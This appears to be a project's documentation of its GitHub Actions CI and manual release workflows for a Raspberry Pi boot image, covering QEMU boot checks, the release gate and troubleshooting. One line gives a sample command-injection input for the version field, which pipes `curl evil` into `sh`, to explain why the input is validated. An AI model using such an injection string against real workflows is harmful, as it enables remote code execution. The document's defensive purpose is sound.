# Continuous integration on GitHub

Two workflows, both on GitHub Actions:

- [`.github/workflows/ci.yml`](../.github/workflows/ci.yml) — builds and boots
- [`.github/workflows/release.yml`](../.github/workflows/release.yml) — publishes

## CI

| Job | When | What |
|---|---|---|
| `board` (matrix) | every push, PR against `main`, manual | one job per board: builds it, lists the partition, and QEMU-boots it |
| `universal` | push to `main` only | builds the all-boards card and boots that one card as `pi-zero2w`, `pi3`, `pi4` and `cm4` in turn |

The `board` matrix has six entries. Four are booted; `pi5` and `cm5` are built
only and emit a `::notice`, because QEMU has no BCM2712 machine type. The jobs
run in parallel and `fail-fast` is off, so one broken board still reports on the
other five. When an emulable board fails, its serial log is uploaded as a
`boot-log-<board>` artifact.

`universal` is gated to `main` so a pull request stays at six jobs, and it is
the last gate before a release: it is the only job that runs `verify-firmware`,
which is possible there because the manifest in `checksums/` covers exactly the
universal artifact set.

## Release

**Always manual.** Nothing publishes on a push, a merge or a tag; the version is
a human decision, so a human types it in. Run it from the Actions tab → Release
→ *Run workflow*:

| Field | |
|---|---|
| *Use workflow from* | ignored — the release always comes from `main`'s head, whatever ref is selected here |
| `version` | required, e.g. `2026.08.27`, `1.0.0` or `1.0.0-rc1`; a leading `v` is added if you leave it off |
| `prerelease` | tick to publish without marking it Latest |

| Job | Runs on | What |
|---|---|---|
| `gate` | bare `ubuntu-latest` | validates the version, resolves `main`'s head, requires a green CI run for *that* commit, refuses a taken tag, release or branch, then branches `main` into `rel-<version>` |
| `build` | `debian:trixie-slim` | checks out `rel-<version>`, rebuilds the universal card, re-checks the pinned manifest, `xz -9`, checksums |
| `publish` | bare `ubuntu-latest` | creates the tag and the release on `rel-<version>`, uploads both assets |
| `rollback` | bare `ubuntu-latest` | on failure, deletes `rel-<version>` again |

### The release branch

`main` is branched into `rel-<version>` before the build, and the build runs on
that branch. That is what makes the released commit something that still
exists afterwards: `main` can move on underneath it, and the exact tree that
was built and tagged is still reachable by name.

Two consequences follow from creating the branch *before* the build:

- **Creating it is a push, so `ci.yml` runs on it too.** That duplicate build
  costs a runner and delays nothing, and "every branch is built" is the rule
  this repository works to.
- **A failed build would leave the branch behind**, and the gate would then
  refuse the retry because the branch exists. So `rollback` deletes it again on
  failure. It holds nothing `main` does not — it was created seconds earlier as
  a pointer to `main`'s head and nothing ever commits to it — so the same
  version can be released again once the failure is fixed. The tag and the
  release are never reached on that path.

`main`'s head is resolved **once**, in the gate, and that one SHA is then used
for the CI check, the branch, the release target and the commit named in the
notes. Reading it again later would open a window where CI was checked on one
commit and a different one was released.

The release is tagged `v<version>` and carries two assets:

```
sepiaos-boot-universal-v<version>.img.xz    the universal card, xz-compressed (~22 MB)
SHA256SUMS                                  its checksum
```

### Why `gate` is a separate job

Everything that can say "no" is cheap, and the build is not. Validating the
version, checking CI and checking the tag all happen on a bare runner in
seconds, so a typo'd version or an already-used tag fails immediately instead of
after a full image build.

It is also where the safety property lives. An automatic trigger would give
"CI passed on this commit" for free; a manual trigger cannot, so `gate` asks the
API for a successful `ci.yml` run whose `head_sha` is the commit being released
— `main`'s head, not whatever ref the workflow was dispatched on — and stops if
there is none.

### Why the version is passed through the environment

`inputs.version` is attacker-controlled text, and `${{ }}` is substituted into
the script *before* bash parses it — a version of `x"; curl evil | sh; #` would
run as a command. It therefore reaches the script as `$VERSION` via `env:`,
where it is only ever data, and is validated against
`^[0-9][0-9A-Za-z.+-]*$` before anything is named after it.

Leading and trailing whitespace is trimmed, but internal whitespace is
rejected rather than removed: silently turning a fat-fingered `1.0 0` into
`1.00` would release the wrong version under a plausible-looking tag.

### How long a release takes, and why

The build is fast — about 40 seconds. Publishing is not: uploading the ~21 MiB
`.img.xz` to GitHub's release-asset endpoint has been measured at **14 minutes**
(≈25 KiB/s), and the run sits in `publish the release` for all of it with no
output. That is normal, not a hang. The release object and `SHA256SUMS` appear
within two seconds; it is only the big asset that crawls.

The payload cannot usefully be shrunk. `kernel8.img` and `kernel_2712.img` are
already-compressed kernel images that `xz -9` only takes from 10.0 MiB to
9.8 MiB each, so 19.6 of the 21.2 MiB is irreducible without dropping boards
from the card. Everything else — 371 overlays, both `start*.elf`, every DTB —
compresses to about 1.5 MiB combined.

Every job carries a `timeout-minutes` so a genuine stall fails in tens of
minutes instead of running to the six-hour default. `publish` allows 45, roughly
three times the worst observed upload.

### Why the release is built twice

`build` rebuilds rather than reusing CI's artifact, in the same container image,
because mtools decides the FAT layout: building the shipped image on a different
distribution would ship an image that is not the one the boot checks passed on.

### Why publishing is a separate job

Only so it can run on the bare runner, where `gh` is preinstalled. Debian does
not package the GitHub CLI, so publishing from the build container would mean
either a third-party action or hand-rolled REST calls.

## One-time setup

No repository secret is required. The release uses GitHub's automatically
provided `GITHUB_TOKEN`. `contents: write` is granted to the `publish` job
alone; every other job in both workflows is read-only.

## Notes on the pipelines

**Why `debian:trixie-slim`.** QEMU's `raspi4b` machine only arrived in **QEMU
9.0**. Debian 12 ships 7.2 and Ubuntu 24.04 ships 8.2, so on either of those the
Pi 4 and CM4 boot checks cannot run at all. Trixie ships QEMU 10.x. If you
change the base image, check `qemu-system-aarch64 -machine help | grep raspi4b`
first.

**Why the build tools are installed before `actions/checkout`.** Without `git`
in the container, checkout silently falls back to downloading a tarball — and
the Makefile needs `git` for the sparse overlays clone. `bsdextrautils` supplies
the `hexdump` that `make verify` uses; `xz-utils` is needed only for the
release.

**Why `QEMU_TIMEOUT: 180`.** GitHub's hosted runners run the AArch64 kernels
under full TCG emulation. That is correct but much slower than an arm64 host,
and the Makefile's 40-second default is not enough headroom.

**Why tag events do not trigger CI.** `branches:` never matches a tag ref, so
cutting a release cannot start a second pipeline for the commit it just built.

**No download caching.** Every job re-fetches the ~28 MB of firmware. Adding a
cache is possible but was left out deliberately: the download is small, it keeps
the pipeline free of plugin dependencies, and it is polite to donated
infrastructure to keep the config simple.

**What a green pipeline does and does not prove.** QEMU emulates the ARM side
only. It never executes `bootcode.bin`, `start.elf`, `config.txt`, device tree
auto-selection or overlay loading, so a green boot check attests to the kernel
and the partition layout and nothing else. No `config.txt` change is verified by
CI; only real hardware tests it.

## Reproducing a CI failure locally

Both workflows only call documented `make` targets, so any failure reproduces
directly:

```sh
make BOARD=pi4 image
make BOARD=pi4 boot-check
make BOARD=universal QEMU_BOARD=pi4 boot-check
```

To reproduce in the same container the runner uses:

```sh
docker run --rm -it -v "$PWD:/src" -w /src debian:trixie-slim bash -c '
  apt-get update -qq
  apt-get install -y -qq --no-install-recommends \
    make mtools qemu-system-arm git curl ca-certificates xz-utils bsdextrautils
  QEMU_TIMEOUT=180 make BOARD=pi4 boot-check'
```

## Troubleshooting

**Everything is skipped / no workflow appears.**
Check that Actions are enabled in the repository and that the workflow file is
present on the branch being tested. `Release` will not appear in the Actions tab
at all until `release.yml` has landed on the default branch — GitHub only offers
*Run workflow* for a `workflow_dispatch` workflow it can see there.

**Boot checks time out.**
The runner is slower than usual. Raise `QEMU_TIMEOUT` in the workflow `env:`.

**`raspi4b` is not a supported machine.**
The base image's QEMU is older than 9.0. See the note above.

**CI passed but no release appeared.**
Expected — releases are never automatic. Trigger `Release` by hand.

**The release seems stuck on `publish the release`.**
Almost certainly not stuck. `gh release create` uploads the ~21 MiB asset with
no progress output, and that upload has been observed to take 14 minutes. Check
the release page: if the tag and `SHA256SUMS` are already there, the big asset
is still on its way. The job's `timeout-minutes: 45` is the real backstop.

**`No green CI run`.**
The commit you are releasing from has no successful `ci.yml` run. Either it was
never pushed, CI is still running, or CI failed. Push it and wait, or re-run CI
on it. Note that this asks about the exact commit: releasing from a branch whose
tip has moved since the last green run will fail here, correctly.

**`Bad version`.**
The `version` input must start with a digit and contain only digits, letters,
`.`, `+` and `-` — `2026.08.27`, `1.0.0`, `1.0.0-rc1`. A leading `v` is
optional. Branch names, paths and anything with a space are rejected.

**`<tag> already released` / `<tag> already tagged`.**
Pick a different version, or remove what is there — `gh release delete <tag>
--cleanup-tag` for a release, `git push --delete origin <tag>` for a bare tag.
Both checks run in `gate`, before anything is built or created, so there is
never a half-finished release to clean up. `gh release create --target` also
makes the tag as part of the release, so "tag exists but the release does not"
cannot arise from a failure partway through publishing.
